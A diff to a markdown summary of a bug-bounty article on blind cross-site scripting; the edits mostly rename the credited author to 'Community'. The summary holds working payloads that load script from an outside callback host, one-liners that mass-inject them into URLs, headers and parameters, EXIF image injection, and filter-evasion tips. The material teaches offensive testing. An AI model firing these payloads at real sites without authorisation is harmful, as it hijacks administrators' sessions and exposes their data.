@@ -1,5 +1,5 @@
-# LostSec: Mastering Blind XSS — Real-World Techniques for High Bounties
-- Source: LostSec (Sep 25, 2025 + Aug 25, 2025) — infosecwriteups.com
+# Community: Mastering Blind XSS — Real-World Techniques for High Bounties
+- Source: Community (Sep 25, 2025 + Aug 25, 2025) — infosecwriteups.com
 - Blind XSS + PasteJacking: stealth payload injection with out-of-band callbacks
 
 ## What is Blind XSS?
@@ -30,7 +30,7 @@ Paste payload into rich-text editors, comment boxes — fires when admin views t
 # XSSHunter - free web-based (bxsshunter.com)
 # Burp Collaborator - built into Burp Pro
 # interactsh - self-hosted, from ProjectDiscovery
-# xss.report - by LostSec/coffinxp
+# xss.report - by Community
 ```
 
 ### Browser Extensions
@@ -48,20 +48,20 @@ Configure browser extension to use payload as custom User-Agent string.
 ## Automation Script (One-Liner BXSS)
 ```bash
 # Crawl targets and inject payload into headers
-cat urls.txt | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+cat urls.txt | bxss -payload '"><script src=https://xss.report/c/Community></script>' -header "X-Forwarded-For"
 
 # GF patterns + blind XSS
 cat urls.txt | gf xss | uro | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
 
 # Mass sub to blind XSS
 subfinder -d target.com | gau | bxss -appendMode \
-  -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+  -payload '"><script src=https://xss.report/c/Community></script>' -parameters
 ```
 
 ## Advanced Technique: EXIF/XSS via Image Metadata
 Inject payload into JPG EXIF data — fires when admin panel processes uploaded images:
 ```bash
-exiftool -Comment='"><script src=https://xss.report/c/coffinxp></script>' image.jpg
+exiftool -Comment='"><script src=https://xss.report/c/Community></script>' image.jpg
 ```
 
 ## Where to Inject Headers
@@ -78,7 +78,7 @@ exiftool -Comment='"><script src=https://xss.report/c/coffinxp></script>' image.
 - Split payload across multiple fields
 - Use SVG/iframe-based vectors instead of <script>
 - String.fromCharCode obfuscation
-- atob() base64 decoding
+- atob base64 decoding
 
 ## Reporting Tips
 - Include screenshot of blind XSS callback dashboard
